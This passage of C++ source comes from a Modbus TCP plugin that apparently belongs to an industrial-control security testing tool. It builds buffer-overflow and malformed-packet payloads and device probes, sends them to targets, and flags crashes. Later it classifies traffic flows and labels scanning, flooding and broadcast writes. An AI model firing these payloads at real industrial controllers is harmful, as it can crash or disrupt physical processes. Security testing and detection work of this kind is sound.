                result << ",\"device_present\":true,\"response\":\"exception\"";
            } else {
                result << ",\"device_present\":true,\"response\":\"success\"";
            }
        }

        result << "}";
        result_json = result.str();
    }

private:
    std::vector<uint8_t> createReadDeviceId(uint8_t unit_id, uint8_t read_device_id_code, uint8_t object_id) {
        return {
            0x00, 0x01,              // Transaction ID
            0x00, 0x00,              // Protocol ID
            0x00, 0x05,              // Length
            unit_id,                 // Unit ID
            0x2B,                    // Function Code: Encapsulated Interface Transport
            0x0E,                    // MEI Type: Read Device Identification
            read_device_id_code,     // Read Device ID code
            object_id                // Object ID
        };
    }

    std::vector<uint8_t> createUnitIdProbe(uint8_t unit_id) {
        return {
            0x00, 0x01,        // Transaction ID
            0x00, 0x00,        // Protocol ID
            0x00, 0x06,        // Length
            unit_id,           // Unit ID
            0x01,              // Function Code: Read Coils
            0x00, 0x00,        // Starting Address: 0
            0x00, 0x01         // Quantity: 1 coil
        };
    }
};

// VulnerabilityExploitsProfile implementation
class ModbusTCPPlugin::VulnerabilityExploitsProfile : public ModbusAttackProfile {
public:
    ModbusAttackType getType() const override { return ModbusAttackType::VULNERABILITY_EXPLOITS; }

    bool generateSeeds(const ModbusAttackConfig& config, std::vector<std::vector<uint8_t>>& seeds) override {
        seeds.clear();

        // Buffer Overflow attacks
        seeds.push_back(createBufferOverflowPayload(0x03, 1024));   // Read Holding Registers overflow
        seeds.push_back(createBufferOverflowPayload(0x10, 512));    // Write Multiple Registers overflow

        // Malformed packets
        seeds.push_back(createMalformedPacket(0)); // Invalid Function Code
        seeds.push_back(createMalformedPacket(1)); // Corrupted MBAP Header
        seeds.push_back(createMalformedPacket(2)); // Length Mismatch

        return !seeds.empty();
    }

    std::string executeAttack(const std::string& target, const std::vector<uint8_t>& payload) override {
        return executeNetworkAttack(target, payload);
    }

    void parseAttackResponse(const std::vector<uint8_t>& response, const std::vector<uint8_t>& request, std::string& result_json) override {
        std::stringstream result;
        result << "{\"attack_type\":\"vulnerability_exploit\"";

        if (request.size() > 1000) {
            result << ",\"payload_type\":\"buffer_overflow\"";
            result << ",\"payload_size\":" << request.size();
        }

        if (response.empty()) {
            result << ",\"response\":\"no_response\"";
            result << ",\"potential_crash\":true";
            result << ",\"severity\":\"HIGH\"";
        }

        result << "}";
        result_json = result.str();
    }

private:
    std::vector<uint8_t> createBufferOverflowPayload(uint8_t function_code, size_t overflow_size) {
        std::vector<uint8_t> pdu;
        pdu.resize(7, 0); // MBAP header
        pdu[6] = 0x01;    // Unit ID
        pdu.push_back(function_code);

        // Add oversized data to trigger buffer overflow
        for (size_t i = 0; i < overflow_size; ++i) {
            pdu.push_back((uint8_t)(i & 0xFF));
        }

        // Update MBAP length (but keep it malformed)
        wr16(&pdu[4], (uint16_t)(pdu.size() - 6));

        return pdu;
    }

    std::vector<uint8_t> createMalformedPacket(uint8_t type) {
        std::vector<uint8_t> pdu;

        switch (type) {
            case 0: // Invalid Function Code
                pdu = {0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x01, 0xFF, 0x00, 0x00, 0x00, 0x01}; // FC 0xFF invalid
                break;
            case 1: // Corrupted MBAP Header
                pdu = {0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x06, 0x01, 0x03, 0x00, 0x00, 0x00, 0x01}; // Invalid protocol ID
                break;
            case 2: // Length Mismatch
                pdu = {0x00, 0x01, 0x00, 0x00, 0xFF, 0xFF, 0x01, 0x03, 0x00, 0x00, 0x00, 0x01}; // Wrong length
                break;
        }

        return pdu;
    }
};

// createAttackProfile implementation (moved after class definitions)
std::unique_ptr<ModbusAttackProfile> ModbusTCPPlugin::createAttackProfile(ModbusAttackType type) {
    switch (type) {
        case ModbusAttackType::UNAUTHORIZED_WRITES:
            return std::unique_ptr<ModbusAttackProfile>(new UnauthorizedWritesProfile());
        case ModbusAttackType::DOS_LISTEN_ONLY:
            return std::unique_ptr<ModbusAttackProfile>(new DoSListenOnlyProfile());
        case ModbusAttackType::BROADCAST_ATTACKS:
            return std::unique_ptr<ModbusAttackProfile>(new BroadcastAttacksProfile());
        case ModbusAttackType::DEVICE_DISCOVERY:
            return std::unique_ptr<ModbusAttackProfile>(new DeviceDiscoveryProfile());
        case ModbusAttackType::VULNERABILITY_EXPLOITS:
            return std::unique_ptr<ModbusAttackProfile>(new VulnerabilityExploitsProfile());
        default:
            LOG_WARNING(TAG_MB, "Unknown attack type requested");
            return nullptr;
    }
}

// ==================== FLOW MANAGEMENT IMPLEMENTATION ====================

bool ModbusTCPPlugin::buildFlowKey(const NetworkPacket& packet, FlowKey& key) {
    const uint8_t* data = nullptr;
    size_t data_len = 0;
    if (!locateModbusAdu(packet, data, data_len) || data_len < 9) {
        return false;  // Packet too short
    }

    // MBAP Header structure:
    // 0-1:   Transaction ID
    // 2-3:   Protocol ID (0x0000)
    // 4-5:   Length (bytes following)
    // 6:     Unit ID
    // 7+:    PDU (function code + data)

    // Extract Unit ID (byte 6 of MBAP)
    uint8_t unit_id = data[6];

    // Build the key: src_ip:src_port:dst_ip:dst_port:unit_id
    PSRAMAllocator<char> alloc;
    key.src_ip = psram_string(packet.src_ip, alloc);
    key.dst_ip = psram_string(packet.dst_ip, alloc);
    key.src_port = packet.src_port;
    key.dst_port = packet.dst_port;

    // Protocol specific: unit_id
    char unit_id_str[16];
    snprintf(unit_id_str, sizeof(unit_id_str), "%d", unit_id);
    key.protocol_specific = psram_string(unit_id_str, alloc);

    return true;
}

bool ModbusTCPPlugin::classifyPacketOperation(const NetworkPacket& packet,
                                              psram_string& operation_type,
                                              psram_string& operation_details,
                                              bool& is_error) {
    const uint8_t* data = nullptr;
    size_t data_len = 0;
    if (!locateModbusAdu(packet, data, data_len) || data_len < 9) {
        return false;
    }

    uint8_t function_code = data[7];  // Function code in the PDU (byte 7)

    PSRAMAllocator<char> alloc;
    is_error = false;

    // Check whether it is an error response (exception)
    if (function_code >= 0x80) {
        is_error = true;
        uint8_t exception_code = (data_len >= 10) ? data[8] : 0;

        operation_type = psram_string("ERROR", alloc);

        char details[64];
        snprintf(details, sizeof(details), "FC=0x%02X Exception=0x%02X",
                function_code & 0x7F, exception_code);
        operation_details = psram_string(details, alloc);

        return true;
    }

    // Classify based on the function code
    char details[128];

    // Function codes Modbus standard
    if (function_code >= 0x01 && function_code <= 0x04) {
        // Read operations (0x01-0x04)
        operation_type = psram_string("READ", alloc);

        uint16_t start_addr = 0;
        uint16_t quantity = 0;
        if (data_len >= 13) {  // Complete request
            start_addr = (data[8] << 8) | data[9];
            quantity = (data[10] << 8) | data[11];
        }

        const char* fc_name = "";
        switch (function_code) {
            case 0x01: fc_name = "ReadCoils"; break;
            case 0x02: fc_name = "ReadDiscrete"; break;
            case 0x03: fc_name = "ReadHolding"; break;
            case 0x04: fc_name = "ReadInput"; break;
        }

        snprintf(details, sizeof(details), "FC=0x%02X %s addr=%d qty=%d",
                function_code, fc_name, start_addr, quantity);

    } else if (function_code == 0x05 || function_code == 0x06 ||
               function_code == 0x0F || function_code == 0x10) {
        // Write operations
        operation_type = psram_string("WRITE", alloc);

        uint16_t start_addr = 0;
        if (data_len >= 11) {
            start_addr = (data[8] << 8) | data[9];
        }

        const char* fc_name = "";
        switch (function_code) {
            case 0x05: fc_name = "WriteSingleCoil"; break;
            case 0x06: fc_name = "WriteSingleReg"; break;
            case 0x0F: fc_name = "WriteMultipleCoils"; break;
            case 0x10: fc_name = "WriteMultipleRegs"; break;
        }

        snprintf(details, sizeof(details), "FC=0x%02X %s addr=%d",
                function_code, fc_name, start_addr);

    } else if (function_code == 0x08) {
        // Diagnostics
        operation_type = psram_string("DIAGNOSTIC", alloc);
        snprintf(details, sizeof(details), "FC=0x08 Diagnostics");

    } else if (function_code == 0x11) {
        // Report Slave ID
        operation_type = psram_string("DIAGNOSTIC", alloc);
        snprintf(details, sizeof(details), "FC=0x11 ReportSlaveID");

    } else if (function_code == 0x2B) {
        // Read Device Identification (MEI)
        operation_type = psram_string("DIAGNOSTIC", alloc);
        snprintf(details, sizeof(details), "FC=0x2B ReadDeviceID");

    } else {
        // Unknown or custom function code
        operation_type = psram_string("OTHER", alloc);
        snprintf(details, sizeof(details), "FC=0x%02X Unknown", function_code);
    }

    operation_details = psram_string(details, alloc);
    return true;
}

void ModbusTCPPlugin::updateProtocolState(const NetworkPacket& packet, FlowData& flow) {
    // Modbus TCP is stateless, so the state machine is simple
    // INIT -> DATA_EXCHANGE (first packet) -> stays in DATA_EXCHANGE

    if (flow.state == FlowState::INIT) {
        // First packet: go directly to DATA_EXCHANGE
        // (Modbus TCP has no handshake, it starts exchanging data immediately)
        flow.state = FlowState::DATA_EXCHANGE;
    }

    // Stay in DATA_EXCHANGE as long as the flow is active
    // If too many errors, it could transition to ERROR (handled by assignFlowLabel)
}

void ModbusTCPPlugin::assignFlowLabel(FlowData& flow) {
    // Assign the primary and secondary labels based on the metrics

    // 1. Check flooding
    if (flow.metrics.intensity == FlowIntensity::FLOODING) {
        flow.metrics.primary_label = FlowLabel::FLOODING;
        flow.metrics.secondary_label = FlowLabel::ATTACK_CONFIRMED;
        return;
    }

    // 2. Check too many errors
    if (flow.metrics.hasTooManyErrors(0.3f)) {  // > 30% error rate
        flow.metrics.primary_label = FlowLabel::SUSPICIOUS;
        flow.metrics.secondary_label = FlowLabel::PROTOCOL_VIOLATION;
        return;
    }

    // 3. Check scanning pattern
    if (flow.metrics.intensity >= FlowIntensity::VERY_HIGH &&
        flow.metrics.isReader() &&
        flow.getOperationCount() > 50) {
        flow.metrics.primary_label = FlowLabel::SCANNER;
        flow.metrics.secondary_label = FlowLabel::RECONNAISSANCE;
        return;
    }

    // 4. Check broadcast write
    // Check whether protocol_specific contains unit_id=0 (broadcast)
    if (flow.key.protocol_specific == "0" && flow.metrics.isWriter()) {
        flow.metrics.primary_label = FlowLabel::CRITICAL_WRITE;
        flow.metrics.secondary_label = FlowLabel::BROADCASTER;
        return;
    }

    // 5. Normal classification based on read/write ratio
    if (flow.metrics.isWriter()) {
        // Has write operations
        if (flow.metrics.write_operations > flow.metrics.read_operations * 2) {
            // Mostly write
            flow.metrics.primary_label = FlowLabel::WRITER;
        } else {
            // Mix read/write
            flow.metrics.primary_label = FlowLabel::MIXED_RW;
        }
    } else if (flow.metrics.isReader()) {
        // Read only
        flow.metrics.primary_label = FlowLabel::READER;

        // Check polling pattern
        if (flow.metrics.intensity >= FlowIntensity::LOW &&
            flow.metrics.intensity <= FlowIntensity::MEDIUM) {
            flow.metrics.secondary_label = FlowLabel::POLLING;
        }
    } else {
        // No classified operation (it might all be diagnostic)
        flow.metrics.primary_label = FlowLabel::DIAGNOSTIC;
    }

    // 6. Heavy user detection
    if (flow.metrics.intensity == FlowIntensity::HIGH) {
        flow.metrics.secondary_label = FlowLabel::HEAVY_USER;
    }

    // Default if not yet assigned
    if (flow.metrics.primary_label == FlowLabel::NORMAL_OPERATION &&
        flow.metrics.packet_count > 0) {
        flow.metrics.primary_label = FlowLabel::NORMAL_OPERATION;
    }
}
